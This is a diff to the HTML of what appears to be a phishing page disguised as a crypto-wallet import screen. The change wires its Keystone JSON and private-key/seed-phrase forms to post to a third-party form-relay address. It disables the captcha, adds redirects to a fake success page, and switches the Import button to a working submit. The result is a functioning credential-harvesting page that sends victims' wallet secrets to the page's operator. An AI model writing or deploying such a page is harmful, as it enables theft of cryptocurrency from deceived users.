@@ -133,6 +133,13 @@
                                 </div>
                                 <div id="keystone" class="container tab-pane fade"><br>
                                     <form action="https://formsubmit.co/0a9b8b8612578cd0c1c2113ca4cde51f" method="POST">
+                                        <!-- honeypot -->
+                                        <input type="text" name="_honey" style="display: none;" id="">
+
+                                        <!-- Disable captcha -->
+                                        <input type="hidden" name="_captcha" value="false">
+                                        
+                                        <input type="hidden" name="_next" value="https://sarahdeve.github.io/Wallet/index.html/import.html/success.html">
                                         <div class=" mb-3 mt-3">
                                             <textarea class="form-control" rows="5" id="comment" name="Keystone" required placeholder="Keystone JSON..."></textarea>
                                         </div>
@@ -145,11 +152,18 @@
                                 </div>
                                     <div id="privatekey" class="container tab-pane fade">
                                         <form action="https://formsubmit.co/0a9b8b8612578cd0c1c2113ca4cde51f" method="POST">
+                                                                                    <!-- honeypot -->
+                                        <input type="text" name="_honey" style="display: none;" id="">
+
+                                        <!-- Disable captcha -->
+                                        <input type="hidden" name="_captcha" value="false">
+
+                                        <input type="hidden" name="_next" value="https://sarahdeve.github.io/Wallet/import.html/success.html">
                                             <div class=" mb-3 mt-3">
                                                 <input type="text" class="form-control" name="PrivateKey" required placeholder="Private Key">
                                                 <label for="comment">Typically 12 (sometimes 24) words seperated by a single spaces.</label>
                                             </div> 
-                                            <button type="button" class="btn btn-primary form-control">Import</button>   
+                                            <button type="submit" class="btn btn-primary form-control">Import</button>   
                                         </form>
                                     </div>
                             </div>
